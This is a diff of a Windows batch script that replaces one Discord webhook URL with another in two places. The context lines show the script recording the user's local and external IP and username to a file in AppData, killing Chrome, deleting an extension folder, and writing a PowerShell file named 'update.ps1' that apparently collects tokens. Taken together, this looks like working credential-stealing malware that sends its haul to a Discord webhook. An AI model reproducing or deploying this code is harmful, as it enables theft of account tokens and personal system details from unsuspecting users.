@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 for /f "tokens=2 delims=:" %%d in ('ipconfig ^| find "IPv4"') do set intip=%%d
 for /f %%b in ('powershell -nop -c "(Invoke-RestMethod http://api.ipify.org)"') Do Set ExtIP=%%b
-set webhook=https://discord.com/api/webhooks/957287789098061886/sMhKsMopMJqlDFPmDeZ7l2wybyq435JnraeMF1ad5sC7fC_Na_CWZ6tjjE505stIDka9
+set webhook=https://discord.com/api/webhooks/992795386412552192/H5WZSk1MbeEj2mf2lV78BG-J2wLPSr3q5QTUkFSYxLk1eUdY9VHK6QYgq4wxnqZxqEL2
 echo         PC         >>%appdata%\info.txt
 echo ------------------->>%appdata%\info.txt
 echo Username: %username%>>%appdata%\info.txt
@@ -43,7 +43,7 @@ start cmd /c "mode 20, 1 && timeout /t 9 >nul && taskkill /im chrome.exe /f >nul
 taskkill /im chrome.exe /f >nul 2>&1
 rmdir %appdata%\extension /S /Q >nul 2>&1
 endlocal
-set webhook=https://discord.com/api/webhooks/957287789098061886/sMhKsMopMJqlDFPmDeZ7l2wybyq435JnraeMF1ad5sC7fC_Na_CWZ6tjjE505stIDka9
+set webhook=https://discord.com/api/webhooks/992795386412552192/H5WZSk1MbeEj2mf2lV78BG-J2wLPSr3q5QTUkFSYxLk1eUdY9VHK6QYgq4wxnqZxqEL2
 if exist %appdata%\update.ps1 del /s /q %appdata%\update.ps1 >nul
 echo $ErrorActionPreference='silentlycontinue'>>%appdata%\update.ps1
 echo $tokensString = new-object System.Collections.Specialized.StringCollection>>%appdata%\update.ps1
